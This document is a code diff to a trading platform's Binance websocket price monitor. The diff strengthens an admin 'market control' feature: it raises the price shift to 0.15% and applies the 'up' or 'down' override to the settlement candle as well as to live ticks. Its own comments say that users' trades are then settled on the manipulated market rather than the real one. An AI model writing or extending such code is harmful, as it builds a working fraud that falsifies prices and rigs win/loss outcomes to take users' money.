@@ -104,17 +104,8 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
     const lastProcessedActivationTs = {};
     let lastCopyTradeCleanup = Date.now();
 
-    // Cache the index module to avoid circular dependency and improve performance
-    let indexModule = {};
-    try {
-        indexModule = require('./index');
-    } catch (e) {
-        console.warn("Could not load index.js for overrides.");
-    }
-
-    // 🚀 NEW: Combine Kline (1m chart/settlement) AND AggTrade (Ultra-Fast Ticks)
+    // Combine Kline (1m chart/settlement) AND AggTrade (Ultra-Fast Ticks)
     const streams = TRADE_PAIRS.map(p => `${p.toLowerCase()}@kline_1m/${p.toLowerCase()}@aggTrade`).join('/');
-    // Use multiplexing URL format for multiple streams
     const wsUrl = `wss://stream.binance.com:9443/stream?streams=${streams}`;
     
     let ws = new WebSocket(wsUrl);
@@ -126,10 +117,16 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
     ws.on('message', async (message) => {
         try {
             const parsedRaw = JSON.parse(message);
-            // Multiplexed streams wrap the data inside a 'data' object
             const parsed = parsedRaw.data ? parsedRaw.data : parsedRaw;
-
             if (!parsed) return;
+
+            // 🚀 FIX 1: Fetch overrides dynamically every tick to catch Live Admin Commands instantly
+            let overrides = {};
+            try {
+                overrides = require('./index').candleOverride || {};
+            } catch (e) {}
+
+            const MANIPULATION_PERCENTAGE = 0.0015; // 0.15% shift for Force UP/DOWN
 
             // ==========================================
             // 1. ULTRA-FAST TICK-BY-TICK PRICE (aggTrade)
@@ -138,11 +135,12 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
                 const pair = parsed.s;
                 let currentPrice = parseFloat(parsed.p);
 
-                // --- ADMIN PANEL MARKET CONTROL ---
-                const overrides = indexModule.candleOverride || {};
-                
-                if (overrides[pair] === 'up') currentPrice += (currentPrice * 0.0005); 
-                else if (overrides[pair] === 'down') currentPrice -= (currentPrice * 0.0005); 
+                // --- Apply Override to Live UI Tick ---
+                if (overrides[pair] === 'up') {
+                    currentPrice += (currentPrice * MANIPULATION_PERCENTAGE); 
+                } else if (overrides[pair] === 'down') {
+                    currentPrice -= (currentPrice * MANIPULATION_PERCENTAGE); 
+                }
 
                 if (!globalMarketData[pair]) {
                     globalMarketData[pair] = { candles: [], currentCandle: null, lastEmit: 0 };
@@ -150,7 +148,7 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
 
                 globalMarketData[pair].currentPrice = currentPrice;
 
-                // Throttling: Frontend par lagatar updates bhej kar server hang hone se bachana (Max 4 ticks per second = 250ms)
+                // Throttling: Send max 4 ticks per second (250ms) to frontend
                 const now = Date.now();
                 if (now - (globalMarketData[pair].lastEmit || 0) > 250) {
                     io.emit('price_update', { pair, price: currentPrice, timestamp: now });
@@ -164,14 +162,28 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
             else if (parsed.e === 'kline') {
                 const pair = parsed.s; 
                 const k = parsed.k;
+                
                 const openPrice = parseFloat(k.o);
+                let closePrice = parseFloat(k.c);
+                let highPrice = parseFloat(k.h);
+                let lowPrice = parseFloat(k.l);
+
+                // 🚀 FIX 2: Apply Override to the Final Settlement Candle as well!
+                // Is se trade real market ki bajaye manipulated market par win/loss hogi
+                if (overrides[pair] === 'up') {
+                    closePrice += (closePrice * MANIPULATION_PERCENTAGE);
+                    highPrice = Math.max(highPrice, closePrice);
+                } else if (overrides[pair] === 'down') {
+                    closePrice -= (closePrice * MANIPULATION_PERCENTAGE);
+                    lowPrice = Math.min(lowPrice, closePrice);
+                }
 
                 const candleObj = {
                     timestamp: new Date(k.t),
                     open: openPrice,
-                    high: parseFloat(k.h),
-                    low: parseFloat(k.l),
-                    close: parseFloat(k.c), // Keep exact kline close for accurate history
+                    high: highPrice,
+                    low: lowPrice,
+                    close: closePrice, 
                     isClosed: k.x
                 };
 
@@ -197,6 +209,7 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
 
                     const lastCompletedTs = candleObj.timestamp.getTime();
                     if (!lastProcessedCompletedCandleTs[pair] || lastProcessedCompletedCandleTs[pair] < lastCompletedTs) {
+                        // Settle trade using the MANIPULATED candleObj
                         await settleActiveTradesForPair(io, User, Trade, pair, candleObj);
                         lastProcessedCompletedCandleTs[pair] = lastCompletedTs;
                     }
